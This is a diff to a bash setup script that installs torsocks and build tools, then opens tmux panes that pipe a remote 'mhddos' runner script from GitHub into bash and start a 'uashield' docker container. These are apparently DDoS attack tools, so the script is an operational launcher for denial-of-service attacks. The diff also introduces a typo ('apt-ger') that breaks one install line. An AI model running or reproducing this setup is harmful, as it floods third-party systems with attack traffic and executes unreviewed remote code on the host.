@@ -1,6 +1,6 @@
 #!/bin/bash
-sudo apt update -y
-sudo apt install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
+sudo apt-get update -y
+sudo apt-ger install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
 pip install --upgrade pip
 
 tmux kill-session -t multiddos
@@ -13,7 +13,7 @@ wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_
 sudo dpkg -i gotop_3.0.0_linux_amd64.deb
 rm *.tar.gz
 
-tmux new-session -s "multid" -d 'gotop -asc solarized'
+tmux new-session -s "multiddos" -d 'gotop -asc solarized'
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
 #tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
